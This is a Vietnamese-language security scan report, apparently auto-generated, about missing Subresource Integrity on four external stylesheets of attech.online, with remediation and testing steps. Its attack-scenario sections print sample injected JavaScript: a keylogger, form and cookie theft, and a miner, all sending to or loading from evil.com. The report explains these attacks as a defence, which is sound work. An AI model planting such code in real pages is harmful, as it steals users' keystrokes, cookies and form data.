# 🔐 Phân biệt kỹ thuật: "Subresource Integrity (SRI) Not Implemented"

**Ngày phân tích:** 13/11/2025 20:44:10  
**Website:** https://attech.online  
**Domain:** attech.online  
**Phân loại:** 🔴 Vulnerability Detected

---

## 🚀 Quick Test Commands (Copy & Paste)

### Test nhanh bằng browser (30 giây):

```bash
# Mở Developer Tools (F12) trong Chrome/Firefox
# → Console → chạy lệnh:

// Kiểm tra scripts thiếu SRI
document.querySelectorAll('script[src]').forEach(s => {
  const isExternal = s.src && !s.src.startsWith(window.location.origin);
  if (isExternal && !s.integrity) {
    console.error('❌ THIẾU SRI:', s.src);
  }
});

// Kiểm tra CSS thiếu SRI
document.querySelectorAll('link[rel="stylesheet"][href]').forEach(l => {
  const isExternal = l.href && !l.href.startsWith(window.location.origin);
  if (isExternal && !l.integrity) {
    console.error('❌ THIẾU SRI:', l.href);
  }
});
```

### Test bằng online tools:

```bash
# 1. SecurityHeaders.com
https://securityheaders.com/?q=https://attech.online

# 2. Mozilla Observatory
https://observatory.mozilla.org/analyze/attech.online

# 3. Scan lại bằng tool này
python3 scanSRI.py https://attech.online
```

---

## 📚 1. Tham chiếu chuẩn kỹ thuật

- **OWASP Top 10 2021:** A05:2021 – Security Misconfiguration
- **CWE-353:** Missing Support for Integrity Check
- **W3C SRI Spec:** Subresource Integrity Level 2
- **MDN Web Docs:** Subresource Integrity

### SRI là gì?

**Subresource Integrity (SRI)** là cơ chế bảo mật cho phép trình duyệt xác minh rằng các tài nguyên được tải từ CDN hoặc nguồn bên ngoài **không bị thay đổi hoặc can thiệp**.

**Cách hoạt động:**
1. Developer tạo hash (SHA256/384/512) của file JS/CSS
2. Thêm hash vào thuộc tính `integrity` của tag
3. Browser tải file và tính hash
4. Nếu hash khớp → file được thực thi
5. Nếu hash không khớp → file bị chặn

**Ví dụ:**
```html
<!-- ✅ CÓ SRI - An toàn -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"
        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
        crossorigin="anonymous"></script>

<!-- ❌ KHÔNG CÓ SRI - Nguy hiểm -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
```

**Tại sao cần SRI?**
- Nếu CDN bị hack, attacker có thể thay thế file bằng mã độc
- Không có SRI → trình duyệt không biết file đã bị thay đổi
- Có SRI → trình duyệt phát hiện và chặn file độc

---

## 🧪 2. Kết quả kiểm tra thực tế

### Test 1: External Scripts

**Tổng số script tags:** 3  
**External scripts:** 0  
**Scripts CÓ SRI:** 0  
**Scripts THIẾU SRI:** 0


### Test 2: External Stylesheets

**Tổng số CSS links:** 9  
**External CSS:** 6  
**CSS CÓ SRI:** 2  
**CSS THIẾU SRI:** 4

| URL | SRI | Crossorigin | Status |
|-----|-----|-------------|--------|
| `https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/boo...` | ✅ Có | ✅ | ✅ |
| `https://fonts.googleapis.com/css2?family=Inter:wght@400;500;...` | ❌ Thiếu | ❌ | ❌ |
| `https://fonts.googleapis.com/css2?family=Inter:wght@400;500;...` | ❌ Thiếu | ❌ | ❌ |
| `https://fonts.googleapis.com/css2?family=Roboto:wght@300;400...` | ❌ Thiếu | ❌ | ❌ |
| `https://fonts.googleapis.com/css2?family=Roboto:wght@300;400...` | ❌ Thiếu | ❌ | ❌ |
| `https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/ani...` | ✅ Có | ✅ | ✅ |


---

## 📊 3. So sánh: Có SRI vs Không có SRI

### ❌ Trường hợp KHÔNG CÓ SRI (nguy hiểm):

```html
<!-- Website vulnerable -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
```

**Rủi ro thực tế:**

1. **CDN bị hack:**
   - Attacker xâm nhập vào CDN server
   - Thay thế `jquery.min.js` bằng version có backdoor
   - TẤT CẢ websites sử dụng CDN này đều bị nhiễm mã độc

2. **Man-in-the-Middle Attack:**
   ```javascript
   // File gốc: jquery.min.js
   // File bị inject bởi attacker:
   !function(){
     // Mã độc keylogger
     document.addEventListener('keypress', e => {
       fetch('https://evil.com/log?key=' + e.key);
     });
   }();
   // ... original jQuery code ...
   ```

3. **DNS Hijacking:**
   - Attacker kiểm soát DNS của cdn.jsdelivr.net
   - Redirect đến server độc hại với file giả
   - User không biết đã tải file từ nguồn sai

### 🔴 Trường hợp HIỆN TẠI (có lỗ hổng):

**4/6 external resources THIẾU SRI:**

**Vấn đề:**
- 🔴 4/6 external resources THIẾU SRI

**Các resources thiếu SRI:**
- ❌ CSS: `https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap`
- ❌ CSS: `https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap`
- ❌ CSS: `https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap`
- ❌ CSS: `https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap`


---

## 🎯 4. Kịch bản tấn công thực tế

### Kịch bản 1: CDN Compromise

```javascript
// 1. Attacker hack vào cdn.jsdelivr.net
// 2. Thay thế jquery.min.js:

// Original jQuery code...
(function($) {
  // Mã độc được inject
  setTimeout(function() {
    // Đánh cắp form data
    $('form').on('submit', function() {
      var formData = $(this).serialize();
      $.post('https://evil.com/steal', {data: formData});
    });
    
    // Đánh cắp cookie
    fetch('https://evil.com/cookie?c=' + document.cookie);
    
    // Crypto mining
    new Worker('https://evil.com/miner.js');
  }, 5000);
})(jQuery);
```

**Impact:**
- Hàng nghìn websites sử dụng CDN này đều bị ảnh hưởng
- User data bị đánh cắp mà không hề biết
- Website reputation bị hủy hoại

### Kịch bản 2: Targeted Attack

```html
<!-- Attacker biết website không có SRI -->
<!-- Tạo phishing page giả mạo CDN -->

<!-- Victim's website loads: -->
<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>

<!-- Attacker's DNS hijacking redirects to: -->
<!-- https://cdn-jsdelivr-net.evil.com/npm/lodash@4.17.21/lodash.min.js -->

<!-- File có mã độc: -->
<script>
// Fake lodash code + keylogger + session hijacking
</script>
```

**Với SRI → Tấn công BỊ CHẶN:**
```html
<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
        integrity="sha384-correct-hash-here"
        crossorigin="anonymous"></script>

<!-- Browser tính hash của file độc → Không khớp → ❌ Blocked -->
<!-- Console error: "Failed to find a valid digest in the 'integrity' attribute" -->
```

---

## 📋 5. Bảng đánh giá bảo vệ

| Tiêu chí | Kết quả | Đánh giá | Điểm |
|----------|---------|----------|------|
| External Resources | ✅ 6 | - | - |
| Resources với SRI | ✅ 2 | 33% coverage | 33/100 |
| Resources thiếu SRI | ❌ 4 | Cần khắc phục | - |

**Tổng điểm bảo vệ:** 33/100

🔴 **Đánh giá:** BẢO VỆ YẾU - Hầu hết resources thiếu SRI

### Vấn đề phát hiện:

- ❌ 4/6 external resources THIẾU SRI

### Điểm mạnh:

- ✅ 2/6 external resources ĐÃ CÓ SRI


---

## 🔧 6. Biện pháp khắc phục

### 🔴 HƯỚNG DẪN THÊM SRI

### Step 1: Tạo SRI Hash

**Cách 1: Sử dụng online tool**

```bash
# SRI Hash Generator
https://www.srihash.org/

# Paste URL của resource → Copy hash
```

**Cách 2: Sử dụng command line**

```bash
# SHA384 (khuyến nghị)
curl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js | \
  openssl dgst -sha384 -binary | \
  openssl base64 -A

# SHA256 (nhanh hơn nhưng kém an toàn)
curl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js | \
  openssl dgst -sha256 -binary | \
  openssl base64 -A

# SHA512 (an toàn nhất nhưng chậm)
curl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js | \
  openssl dgst -sha512 -binary | \
  openssl base64 -A
```

**Cách 3: Sử dụng Node.js**

```javascript
// generate-sri.js
const crypto = require('crypto');
const https = require('https');

function generateSRI(url, algorithm = 'sha384') {
  https.get(url, (res) => {
    const hash = crypto.createHash(algorithm);
    res.on('data', (data) => hash.update(data));
    res.on('end', () => {
      const base64Hash = hash.digest('base64');
      console.log(`${algorithm}-${base64Hash}`);
    });
  });
}

// Usage
generateSRI('https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js');
```

### Step 2: Thêm SRI vào HTML

**Scripts:**
```html
<!-- ❌ TRƯỚC: Không có SRI -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>

<!-- ✅ SAU: Có SRI -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"
        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
        crossorigin="anonymous"></script>
```

**Stylesheets:**
```html
<!-- ❌ TRƯỚC: Không có SRI -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">

<!-- ✅ SAU: Có SRI -->
<link rel="stylesheet" 
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
      crossorigin="anonymous">
```

### Step 3: Tự động hóa SRI (Webpack/Vite)

**Webpack:**
```javascript
// webpack.config.js
const SriPlugin = require('webpack-subresource-integrity');

module.exports = {
  plugins: [
    new SriPlugin({
      hashFuncNames: ['sha384'],
      enabled: process.env.NODE_ENV === 'production',
    }),
  ],
  output: {
    crossOriginLoading: 'anonymous',
  },
};
```

**Vite:**
```javascript
// vite.config.js
import { defineConfig } from 'vite';
import { viteSingleFile } from 'vite-plugin-singlefile';

export default defineConfig({
  plugins: [
    {
      name: 'add-sri',
      transformIndexHtml(html) {
        // Add SRI to external resources
        return html.replace(
          /<(script|link)[^>]*src="(https?:\/\/[^"]+)"[^>]*>/g,
          (match, tag, url) => {
            // Generate and add integrity attribute
            return match.replace('>', ` integrity="sha384-..." crossorigin="anonymous">`);
          }
        );
      },
    },
  ],
});
```

### Step 4: Thêm CSP để yêu cầu SRI (Optional)

```nginx
# Nginx - Yêu cầu SRI cho tất cả scripts và styles
add_header Content-Security-Policy "require-sri-for script style;" always;
```

**⚠️ Lưu ý quan trọng:**

1. **crossorigin="anonymous" BẮT BUỘC:**
   - Không có crossorigin → SRI không hoạt động với CORS resources
   - Always thêm `crossorigin="anonymous"` cùng với `integrity`

2. **Hash phải chính xác:**
   - Nếu file thay đổi (kể cả 1 byte) → hash không khớp → file bị chặn
   - Luôn generate lại hash khi update version

3. **Fallback strategy:**
   ```html
   <!-- Cách 1: Fallback to self-hosted -->
   <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"
           integrity="sha384-..."
           crossorigin="anonymous"
           onerror="this.onerror=null;this.src='/js/jquery.min.js'"></script>
   
   <!-- Cách 2: Multiple CDN fallback -->
   <script>
   window.jQuery || document.write('<script src="https://cdn2.com/jquery.min.js"><\/script>');
   </script>
   ```

---

## ✅ 7. Kiểm tra lại sau khi khắc phục

### Bước 1: Kiểm tra bằng Browser DevTools

```bash
# 1. Mở https://attech.online trong Chrome
# 2. F12 → Console
# 3. Chạy script:

// Kiểm tra tất cả external resources có SRI
let missingCount = 0;

document.querySelectorAll('script[src]').forEach(s => {
  const isExternal = s.src && !s.src.startsWith(window.location.origin);
  if (isExternal && !s.integrity) {
    console.error('❌ Script thiếu SRI:', s.src);
    missingCount++;
  } else if (isExternal && s.integrity) {
    console.log('✅ Script có SRI:', s.src);
  }
});

document.querySelectorAll('link[rel="stylesheet"][href]').forEach(l => {
  const isExternal = l.href && !l.href.startsWith(window.location.origin);
  if (isExternal && !l.integrity) {
    console.error('❌ CSS thiếu SRI:', l.href);
    missingCount++;
  } else if (isExternal && l.integrity) {
    console.log('✅ CSS có SRI:', l.href);
  }
});

console.log(missingCount === 0 ? '✅ TẤT CẢ ĐỀU CÓ SRI!' : `❌ ${missingCount} resources thiếu SRI`);
```

### Bước 2: Test SRI có hoạt động không

```javascript
// Test: Thay đổi integrity hash để xem có bị chặn không
// 1. Inspect element một script có SRI
// 2. Edit HTML → thay đổi integrity hash
// 3. Reload page
// 4. Kiểm tra Console → phải thấy error:
// "Failed to find a valid digest in the 'integrity' attribute"
```

### Bước 3: Scan lại bằng online tools

```bash
# 1. SecurityHeaders.com
https://securityheaders.com/?q=https://attech.online

# 2. Mozilla Observatory
https://observatory.mozilla.org/analyze/attech.online

# 3. Scan lại bằng tool này
python3 scanSRI.py https://attech.online

# Điểm protection score phải = 100
```

### Bước 4: Test với modified file

```bash
# Tạo test case: Giả lập CDN bị hack

# 1. Download original file
curl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js > jquery.original.js

# 2. Modify file (thêm 1 ký tự)
echo "/* hacked */" >> jquery.original.js

# 3. Host file modified locally và point <script> đến đó
# 4. Nếu SRI hoạt động → file sẽ BỊ CHẶN với error trong Console

# Expected error:
# "Failed to find a valid digest in the 'integrity' attribute for 
#  resource 'https://...' with computed SHA-384 integrity '...'. 
#  The resource has been blocked."
```

### Bước 5: Automated testing

```javascript
// sri-test.js - Playwright/Puppeteer test
const { test, expect } = require('@playwright/test');

test('All external resources have SRI', async ({ page }) => {
  await page.goto('https://attech.online');
  
  const scriptsWithoutSRI = await page.evaluate(() => {
    return Array.from(document.querySelectorAll('script[src]'))
      .filter(s => {
        const isExternal = s.src && !s.src.startsWith(window.location.origin);
        return isExternal && !s.integrity;
      })
      .map(s => s.src);
  });
  
  const cssWithoutSRI = await page.evaluate(() => {
    return Array.from(document.querySelectorAll('link[rel="stylesheet"][href]'))
      .filter(l => {
        const isExternal = l.href && !l.href.startsWith(window.location.origin);
        return isExternal && !l.integrity;
      })
      .map(l => l.href);
  });
  
  expect(scriptsWithoutSRI).toHaveLength(0);
  expect(cssWithoutSRI).toHaveLength(0);
});
```

---

## 📊 8. Kết luận và khuyến nghị

### Đánh giá tổng quan:

🔴 **Website CÓ LỖ HỔNG SRI**

**Điểm bảo vệ:** 33/100
**Mức độ rủi ro:** Medium
**CVSS Score:** 4.3

**Vấn đề phát hiện:**
- ❌ 4/6 external resources THIẾU SRI

**Tác động:**
- CDN bị hack có thể inject mã độc vào website
- Attacker có thể thực thi arbitrary JavaScript
- Đánh cắp user data, session tokens, credentials
- Website reputation bị hủy hoại

**Hành động khuyến nghị:**
1. 🔴 **KHẨN CẤP** - Thêm SRI cho TẤT CẢ external resources (Step 1-2 trong mục 6)
2. 🧪 **TEST KỸ** - Verify SRI hoạt động đúng (mục 7)
3. ✅ **VERIFY** - Scan lại bằng tool và online services
4. 🔄 **AUTOMATE** - Setup CI/CD để auto-generate SRI (Step 3 trong mục 6)
5. 📊 **MONITOR** - Regular scan (monthly) để đảm bảo không bỏ sót


---

## 📖 9. SRI Best Practices

### 1. Luôn sử dụng SHA-384 hoặc SHA-512

```html
<!-- ✅ TỐT -->
<script src="..." integrity="sha384-..." crossorigin="anonymous"></script>
<script src="..." integrity="sha512-..." crossorigin="anonymous"></script>

<!-- ⚠️ CHẤP NHẬN ĐƯỢC -->
<script src="..." integrity="sha256-..." crossorigin="anonymous"></script>

<!-- ❌ KHÔNG BAO GIỜ -->
<script src="..." integrity="md5-..." crossorigin="anonymous"></script>
```

### 2. Multiple hashes cho fallback

```html
<!-- Browser sẽ thử từng hash cho đến khi tìm được hash khớp -->
<script src="https://cdn.example.com/framework.js"
        integrity="sha384-hash1 sha512-hash2"
        crossorigin="anonymous"></script>
```

### 3. SRI với dynamic imports

```javascript
// Dynamic import với SRI
import('https://cdn.example.com/module.js')
  .then(module => {
    // Module đã được verify bởi browser
  })
  .catch(err => {
    console.error('SRI verification failed:', err);
    // Fallback to self-hosted
    return import('/js/module.js');
  });
```

### 4. Monitoring SRI failures

```javascript
// Global error handler cho SRI failures
window.addEventListener('error', (e) => {
  if (e.target.tagName === 'SCRIPT' || e.target.tagName === 'LINK') {
    console.error('SRI failure detected:', {
      url: e.target.src || e.target.href,
      integrity: e.target.integrity
    });
    
    // Send to monitoring service
    fetch('/api/log-sri-failure', {
      method: 'POST',
      body: JSON.stringify({
        resource: e.target.src || e.target.href,
        timestamp: new Date().toISOString()
      })
    });
  }
}, true);
```

### 5. CI/CD Integration

```yaml
# .github/workflows/sri-check.yml
name: Check SRI

on: [push, pull_request]

jobs:
  sri-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Check SRI for external resources
        run: |
          python3 scanSRI.py https://your-site.com
          
      - name: Fail if SRI missing
        run: |
          if grep -q "THIẾU SRI" sri_report.md; then
            echo "❌ External resources missing SRI!"
            exit 1
          fi
```

---

## 🔗 References

- [W3C SRI Specification](https://www.w3.org/TR/SRI/)
- [MDN - Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
- [SRI Hash Generator](https://www.srihash.org/)
- [OWASP SRI Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html)

---

**Prepared by:** SRI Security Scanner  
**Scan Time:** 2025-11-13 20:44:10  
**Report Version:** 1.0  
**Tool Version:** 1.0.0
